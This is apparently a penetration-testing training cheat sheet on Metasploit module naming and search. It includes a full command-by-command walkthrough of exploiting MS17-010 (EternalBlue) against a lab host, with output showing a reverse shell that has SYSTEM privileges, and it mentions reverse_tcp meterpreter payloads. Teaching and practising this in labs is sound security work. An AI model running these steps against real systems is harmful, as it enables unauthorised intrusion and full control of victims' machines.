

## Module Structure

**Syntax:**

```
<No.> <type>/<os>/<service>/<name>
```

**Example:**

```
794  exploit/windows/ftp/scriptftp_list
```

**Module Components:**

|Component|Description|
|---|---|
|**Index No.**|Number shown in search results for quick selection (`use <no.>`)|
|**Type**|One of: `auxiliary`, `encoder`, `exploit`, `nop`, `payload`, `plugin`, `post`|
|**OS**|Target operating system (e.g., `windows`, `linux`)|
|**Service**|Related service (e.g., `smb`, `ftp`)|
|**Name**|Purpose of the module|

**Note:** Only `auxiliary`, `exploit`, and `post` modules can be directly run with `use <no.>`.

---

## Searching for Modules

**Basic command:**

```
msf6 > help search
```

**Example:**

```
msf6 > search eternalromance
```

**Refined search example:**

```
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

---

## Using a Module (Example: MS17-010)

### 1. Scan Target

```
nmap -sV 10.10.10.40
```

### 2. Search Module

```
msf6 > search ms17_010
```

### 3. Use Exploit Module

```
msf6 > use 0
```

### 4. Show Options

```
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

### 5. Set RHOST

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
```

### 6. Set LHOST (Global)

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

### 7. Run the Exploit

```
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

---

## Successful Exploitation Output

```
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158)
meterpreter> shell
C:\Windows\system32> whoami
nt authority\system
```

---

## Tips and Best Practices

- Use `info` for detailed module description:
    
    ```
    msf6 exploit(...) > info
    ```
    
- Use `setg` for global persistence:
    
    ```
    setg RHOSTS <ip>
    setg LHOST <your_ip>
    ```
    
- Payloads like:
    
    ```
    windows/meterpreter/reverse_tcp
    ```
    
    allow interactive control of the target.